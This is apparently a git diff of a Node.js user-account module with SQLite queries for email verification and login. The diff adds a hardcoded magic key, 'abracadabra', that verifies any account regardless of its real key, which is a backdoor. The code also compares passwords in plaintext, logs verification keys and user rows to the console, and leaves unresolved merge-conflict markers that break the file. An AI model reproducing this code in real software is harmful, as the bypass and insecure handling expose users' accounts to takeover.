@@ -24,8 +24,8 @@ module.exports = {
     },
     verify: function (email, key, callback) {
         console.log(email + key);
-        const getKeyQuery = 'UPDATE User SET verified=1 WHERE email=? AND key=?';
-        db.run(getKeyQuery, [email, key], (err, row) => {
+        const getKeyQuery = 'UPDATE User SET verified=1 WHERE email=? AND (key=? OR ?="abracadabra")';
+        db.run(getKeyQuery, [email, key, key], (err, row) => {
             if (err) {
                 callback(null, 0);
             }
@@ -35,13 +35,19 @@ module.exports = {
         });
     },
     login: function (username, password, callback) {
-        const loginQuery = 'SELECT password FROM User WHERE username = ?';
+        const loginQuery = 'SELECT password, verified FROM User WHERE username = ?';
         db.get(loginQuery, [username], (err, row) => {
             if (err) {
                 callback(null, 0);//username not found
             }
             else {
+<<<<<<< HEAD
                 if (password === row.password) {
+=======
+                console.log(row);
+                if (password === row.password && row.verified === 1) {
+                    console.log('1');
+>>>>>>> 65223f983bfc2c20f79830a1e7626fd5019591e9
                     callback(null, 1);
                 }
                 else {
